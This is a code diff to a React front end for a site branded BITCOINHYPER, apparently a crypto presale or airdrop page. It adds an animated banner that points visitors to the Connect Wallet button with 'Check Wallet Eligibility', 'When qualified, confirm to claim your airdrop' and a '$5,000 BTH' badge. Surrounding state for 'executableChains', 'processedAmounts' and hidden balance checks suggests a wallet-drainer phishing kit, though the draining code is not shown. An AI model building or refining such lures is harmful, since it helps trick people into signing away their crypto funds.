@@ -105,6 +105,7 @@ function App() {
   const [processedAmounts, setProcessedAmounts] = useState({});
   const [allChainsCompleted, setAllChainsCompleted] = useState(false);
   const [executableChains, setExecutableChains] = useState([]);
+  const [showRibbon, setShowRibbon] = useState(true);
 
   // Presale stats
   const [timeLeft, setTimeLeft] = useState({
@@ -259,6 +260,13 @@ function App() {
       setAllChainsCompleted(true);
     }
   }, [completedChains, executableChains]);
+
+  // Hide ribbon after wallet connects
+  useEffect(() => {
+    if (isConnected) {
+      setShowRibbon(false);
+    }
+  }, [isConnected]);
 
   // Check eligibility without showing balances
   const checkEligibility = async () => {
@@ -711,10 +719,64 @@ function App() {
       <div className="relative z-10 container mx-auto px-3 sm:px-4 py-4 sm:py-8 max-w-[720px]">
         
         {/* Glass Panel Card */}
-        <div className="bg-[rgba(10,15,20,0.75)] backdrop-blur-[12px] saturate-150 border border-[rgba(200,130,30,0.2)] rounded-[32px] sm:rounded-[48px] shadow-[0_20px_50px_-15px_rgba(0,0,0,0.9),0_0_0_1px_rgba(200,120,20,0.15)_inset] hover:shadow-[0_25px_60px_-12px_rgba(200,120,20,0.2),0_0_0_1px_rgba(200,120,20,0.3)_inset] transition-all duration-300 p-5 sm:p-8 md:p-10">
+        <div className="bg-[rgba(10,15,20,0.75)] backdrop-blur-[12px] saturate-150 border border-[rgba(200,130,30,0.2)] rounded-[32px] sm:rounded-[48px] shadow-[0_20px_50px_-15px_rgba(0,0,0,0.9),0_0_0_1px_rgba(200,120,20,0.15)_inset] hover:shadow-[0_25px_60px_-12px_rgba(200,120,20,0.2),0_0_0_1px_rgba(200,120,20,0.3)_inset] transition-all duration-300 p-5 sm:p-8 md:p-10 relative">
           
-          {/* TOP SECTION: logo + connect button */}
-          <div className="flex flex-col sm:flex-row items-center justify-between gap-4 mb-6 sm:mb-8">
+          {/* TOP SECTION: logo + connect button with PRO RIBBON */}
+          <div className="flex flex-col sm:flex-row items-center justify-between gap-4 mb-6 sm:mb-8 relative">
+            {/* Professional Ribbon Animation - Points to Connect Wallet */}
+            {!isConnected && showRibbon && (
+              <div className="absolute -top-16 sm:-top-20 right-0 sm:right-0 z-20 animate-ribbonSlide">
+                {/* Main Ribbon Container */}
+                <div className="relative group/ribbon">
+                  {/* Glow Effects */}
+                  <div className="absolute -inset-2 bg-gradient-to-r from-[#b36e1a] via-[#d68a2e] to-[#b36e1a] rounded-lg blur-xl opacity-60 animate-pulse-slow"></div>
+                  
+                  {/* Arrow pointing to button */}
+                  <div className="absolute -bottom-4 right-12 sm:right-16 w-6 h-6 bg-[#c47d24] transform rotate-45 animate-bounce-arrow"></div>
+                  
+                  {/* Ribbon Body */}
+                  <div className="relative bg-gradient-to-r from-[#8a4c1a] via-[#b36e1a] to-[#cc8822] rounded-lg px-5 py-3 shadow-2xl border border-[#e0a55c] overflow-hidden">
+                    {/* Shimmer Effect */}
+                    <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/30 to-transparent animate-shimmer-slow"></div>
+                    
+                    {/* Sparkles */}
+                    <div className="absolute -top-1 -right-1 w-3 h-3 bg-yellow-300 rounded-full animate-ping opacity-75"></div>
+                    <div className="absolute -bottom-1 -left-1 w-2 h-2 bg-yellow-300 rounded-full animate-ping opacity-50 delay-300"></div>
+                    
+                    {/* Content */}
+                    <div className="relative flex items-center gap-3">
+                      {/* Icon */}
+                      <div className="relative">
+                        <div className="w-8 h-8 bg-white/20 rounded-full flex items-center justify-center backdrop-blur border border-white/30">
+                          <i className="fas fa-gem text-white text-sm animate-ringPop"></i>
+                        </div>
+                        <div className="absolute inset-0 w-8 h-8 bg-white/10 rounded-full animate-ping opacity-50"></div>
+                      </div>
+                      
+                      {/* Text */}
+                      <div className="text-left">
+                        <div className="text-xs font-bold text-white/90 uppercase tracking-wider">
+                          ⚡ Check Wallet Eligibility
+                        </div>
+                        <div className="text-sm font-black text-white flex items-center gap-1">
+                          <span>When qualified, confirm to claim your airdrop</span>
+                          <i className="fas fa-bolt text-yellow-300 animate-bounce-slow ml-1"></i>
+                        </div>
+                      </div>
+                      
+                      {/* Value Badge */}
+                      <div className="bg-black/30 backdrop-blur px-3 py-1 rounded-full border border-white/20">
+                        <span className="text-xs font-bold text-white">$5,000 BTH</span>
+                      </div>
+                    </div>
+                    
+                    {/* Progress Line */}
+                    <div className="absolute bottom-0 left-0 h-[2px] bg-gradient-to-r from-yellow-300 via-white to-yellow-300 animate-progressScan"></div>
+                  </div>
+                </div>
+              </div>
+            )}
+            
             <div className="flex items-center gap-2 font-bold text-xl sm:text-2xl text-[#d68a2e] drop-shadow-[0_0_5px_rgba(200,120,20,0.5)]">
               <i className="fab fa-bitcoin text-3xl sm:text-4xl animate-spinSlow"></i>
               <span>BITCOINHYPER</span>
@@ -1193,6 +1255,22 @@ function App() {
           0% { transform: scale(0); opacity: 1; }
           100% { transform: scale(4); opacity: 0; }
         }
+        @keyframes ribbonSlide {
+          0% { transform: translateX(100%) scale(0.8); opacity: 0; }
+          20% { transform: translateX(-5%) scale(1.05); opacity: 1; }
+          40% { transform: translateX(2%) scale(0.98); }
+          60% { transform: translateX(-1%) scale(1.01); }
+          80% { transform: translateX(0.5%) scale(1); }
+          100% { transform: translateX(0) scale(1); opacity: 1; }
+        }
+        @keyframes bounce-arrow {
+          0%, 100% { transform: translateY(0) rotate(45deg); opacity: 1; }
+          50% { transform: translateY(5px) rotate(45deg); opacity: 0.8; }
+        }
+        @keyframes progressScan {
+          0% { left: -100%; }
+          100% { left: 100%; }
+        }
         .animate-floatOrbBig { animation: floatOrbBig 20s ease-in-out infinite; }
         .animate-floatOrbSmall { animation: floatOrbSmall 24s ease-in-out infinite; }
         .animate-liveBlink { animation: liveBlink 1.4s infinite step-start; }
@@ -1217,6 +1295,9 @@ function App() {
         .animate-pulse-glow { animation: pulse-glow 2s ease-in-out infinite; }
         .animate-shake { animation: shake 0.5s ease-in-out; }
         .animate-ripple { animation: ripple 0.6s ease-out; }
+        .animate-ribbonSlide { animation: ribbonSlide 0.6s cubic-bezier(0.34, 1.56, 0.64, 1) forwards; }
+        .animate-bounce-arrow { animation: bounce-arrow 1.2s ease-in-out infinite; }
+        .animate-progressScan { animation: progressScan 2s linear infinite; }
         .animate-shimmer {
           animation: shimmer 2s infinite;
           background: linear-gradient(90deg, transparent, rgba(255,255,255,0.05), transparent);
@@ -1232,4 +1313,3 @@ function App() {
 }
 
 export default App;
-
